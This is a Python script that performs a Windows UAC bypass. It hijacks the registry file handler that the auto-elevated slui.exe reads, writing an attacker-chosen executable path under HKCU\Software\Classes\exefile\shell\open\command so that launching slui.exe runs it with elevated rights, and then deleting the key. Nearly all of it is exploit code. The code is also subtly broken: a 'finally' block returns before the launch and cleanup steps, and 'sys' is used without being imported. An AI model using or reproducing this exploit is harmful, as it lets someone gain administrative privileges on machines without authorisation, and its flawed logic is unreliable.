"""
https://github.com/bytecode-77/slui-file-handler-hijack-privilege-escalation/
	
slui.exe is an auto-elevated binary that is vulnerable to file handler hijacking
Read access to HKCU\Software\Classes\exefile\shell\open is performed upon         
execution. Due to the registry key being accessible from user mode, an arbitrary 
executable file can be provided. 
"""

import os
import _winreg
import win32api
import win32con

def slui_file_hijack(executable_path):
	registry_path = r"Software\Classes\exefile\shell\open\command"
	
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,registry_path)
		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,executable_path)
	except Exception as e:
		return False
	except WindowsError as e:
		return False
	finally:
		_winreg.CloseKey(key)
		return True
	try:
		win32api.ShellExecute(0,None,"c:\windows\system32\slui.exe", None, None, win32con.SW_SHOW)
	except Exception as error:
		sys.exit()
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\exefile")
	except Exception as error:
		return False	
